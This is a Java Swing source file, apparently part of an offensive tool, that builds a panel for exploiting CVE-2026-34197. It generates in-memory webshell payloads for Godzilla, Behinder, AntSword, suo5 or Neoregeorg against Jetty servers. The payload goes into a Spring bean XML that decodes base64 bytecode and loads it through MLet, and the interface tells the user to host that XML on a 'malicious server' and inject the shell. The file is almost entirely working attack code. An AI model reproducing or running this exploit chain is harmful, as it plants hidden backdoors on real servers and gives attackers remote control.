package cc.kiiy.ui;

import jmg.core.config.Constants;
import jmg.core.config.AbstractConfig;
import jmg.sdk.jMGenerator;
import jmg.sdk.util.SDKResultUtil;

import javax.swing.*;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.awt.event.ActionListener;
import java.util.Base64;

public class CVE202634197Panel extends JPanel {

    private JComboBox<String> toolTypeCombo;
    private JButton generateButton;
    private JButton copyXmlButton;
    private JButton injectButton;
    private JTextArea beanXmlArea;
    private JTextArea resultArea;
    private String currentConnectionInfo = "";

    public CVE202634197Panel() {
        setLayout(new BorderLayout(10, 10));

        JPanel topPanel = new JPanel(new GridBagLayout());
        topPanel.setBorder(new TitledBorder("CVE-2026-34197 内存马生成与注入"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.anchor = GridBagConstraints.WEST;

        gbc.gridx = 0; gbc.gridy = 0;
        topPanel.add(new JLabel("工具类型:"), gbc);

        gbc.gridx = 1; gbc.gridy = 0;
        String[] tools = {"Godzilla", "Behinder", "AntSword", "suo5", "Neoregeorg"};
        toolTypeCombo = new JComboBox<>(tools);
        topPanel.add(toolTypeCombo, gbc);

        gbc.gridx = 2; gbc.gridy = 0;
        generateButton = new JButton("生成 BeanXML");
        topPanel.add(generateButton, gbc);

        gbc.gridx = 3; gbc.gridy = 0;
        copyXmlButton = new JButton("复制 XML");
        topPanel.add(copyXmlButton, gbc);

        gbc.gridx = 4; gbc.gridy = 0;
        injectButton = new JButton("注入内存马");
        topPanel.add(injectButton, gbc);

        add(topPanel, BorderLayout.NORTH);

        beanXmlArea = new JTextArea();
        beanXmlArea.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        beanXmlArea.setLineWrap(true);
        beanXmlArea.setWrapStyleWord(true);
        JScrollPane beanXmlScroll = new JScrollPane(beanXmlArea);
        beanXmlScroll.setBorder(new TitledBorder("生成的 BeanXML (请复制到你的恶意服务器 poc.xml)"));

        resultArea = new JTextArea();
        resultArea.setFont(new Font("Microsoft YaHei UI", Font.PLAIN, 14));
        resultArea.setEditable(false);
        JScrollPane resultScroll = new JScrollPane(resultArea);
        resultScroll.setBorder(new TitledBorder("执行输出 & 连接信息"));

        JSplitPane splitPane = new JSplitPane(JSplitPane.VERTICAL_SPLIT, beanXmlScroll, resultScroll);
        splitPane.setDividerLocation(300);
        splitPane.setResizeWeight(0.5);
        splitPane.setContinuousLayout(true);

        add(splitPane, BorderLayout.CENTER);

        generateButton.addActionListener(e -> generateBeanXml());
        
        copyXmlButton.addActionListener(e -> {
            String xmlContent = beanXmlArea.getText();
            if (xmlContent != null && !xmlContent.isEmpty()) {
                java.awt.datatransfer.StringSelection stringSelection = new java.awt.datatransfer.StringSelection(xmlContent);
                java.awt.Toolkit.getDefaultToolkit().getSystemClipboard().setContents(stringSelection, null);
                JOptionPane.showMessageDialog(this, "XML 内容已成功复制到剪贴板！", "复制成功", JOptionPane.INFORMATION_MESSAGE);
            } else {
                JOptionPane.showMessageDialog(this, "没有可复制的 XML 内容，请先生成！", "提示", JOptionPane.WARNING_MESSAGE);
            }
        });
    }

    private void generateBeanXml() {
        String selectedTool = (String) toolTypeCombo.getSelectedItem();
        String toolConstant = Constants.TOOL_GODZILLA;
        switch (selectedTool) {
            case "Godzilla": toolConstant = Constants.TOOL_GODZILLA; break;
            case "Behinder": toolConstant = Constants.TOOL_BEHINDER; break;
            case "AntSword": toolConstant = Constants.TOOL_ANTSWORD; break;
            case "suo5": toolConstant = Constants.TOOL_SUO5; break;
            case "Neoregeorg": toolConstant = Constants.TOOL_NEOREGEORG; break;
        }

        final String finalTool = toolConstant;
        try {
            AbstractConfig config = new AbstractConfig() {{
                setToolType(finalTool);
                setServerType(Constants.SERVER_JETTY);
                setShellType(Constants.SHELL_JAKARTA_LISTENER);
                setOutputFormat(Constants.FORMAT_BASE64);
                setGadgetType(Constants.GADGET_NONE);
                build();
            }};

            jMGenerator generator = new jMGenerator(config);
            generator.genPayload();
            String base64Payload = generator.formatPayload();
            byte[] decodedBytes = Base64.getDecoder().decode(base64Payload);
            int byteSize = decodedBytes.length;

            String xmlTemplate = "<beans\n" +
                    "    xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                    "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                    "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n" +
                    "                        http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                    "\n" +
                    "    <bean id=\"base64Decoder\" class=\"org.springframework.beans.factory.config.MethodInvokingFactoryBean\">\n" +
                    "        <property name=\"staticMethod\" value=\"java.util.Base64.getDecoder\"/>\n" +
                    "    </bean>\n" +
                    "\n" +
                    "    <bean id=\"decodedBytes\" class=\"org.springframework.beans.factory.config.MethodInvokingFactoryBean\">\n" +
                    "        <property name=\"targetObject\" ref=\"base64Decoder\"/>\n" +
                    "        <property name=\"targetMethod\" value=\"decode\"/>\n" +
                    "        <property name=\"arguments\">\n" +
                    "            <list>\n" +
                    "                <value>%s</value>\n" +
                    "            </list>\n" +
                    "        </property>\n" +
                    "    </bean>\n" +
                    "\n" +
                    "    <bean id=\"mlet\" class=\"javax.management.loading.MLet\"/>\n" +
                    "\n" +
                    "    <bean id=\"payloadClass\" factory-bean=\"mlet\" factory-method=\"defineClass\">\n" +
                    "        <constructor-arg value=\"%s\"/>\n" +
                    "        <constructor-arg ref=\"decodedBytes\"/>\n" +
                    "        <constructor-arg type=\"int\" value=\"0\"/>\n" +
                    "        <constructor-arg type=\"int\" value=\"%d\"/>\n" +
                    "    </bean>\n" +
                    "\n" +
                    "    <bean factory-bean=\"payloadClass\" factory-method=\"newInstance\"/>\n" +
                    "\n" +
                    "</beans>";

            String finalXml = String.format(xmlTemplate, base64Payload, config.getInjectorClassName(), byteSize);
            beanXmlArea.setText(finalXml);
            
            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
            java.io.PrintStream ps = new java.io.PrintStream(baos);
            java.io.PrintStream oldOut = System.out;
            System.setOut(ps);
            SDKResultUtil.printBasicInfo(config);
            SDKResultUtil.printDebugInfo(config);
            System.setOut(oldOut);
            
            currentConnectionInfo = baos.toString();
            resultArea.setText("生成完成！请将上方的 BeanXML 复制到恶意服务器的 poc.xml 中。\n\n预期连接信息：\n" + currentConnectionInfo);

        } catch (Throwable ex) {
            resultArea.setText("生成失败：" + ex.getMessage());
            ex.printStackTrace();
        }
    }

    public void addInjectListener(ActionListener listener) {
        injectButton.addActionListener(listener);
    }
    
    public void setResultText(String text) {
        resultArea.setText(text);
    }
    
    public String getCurrentConnectionInfo() {
        return currentConnectionInfo;
    }
}
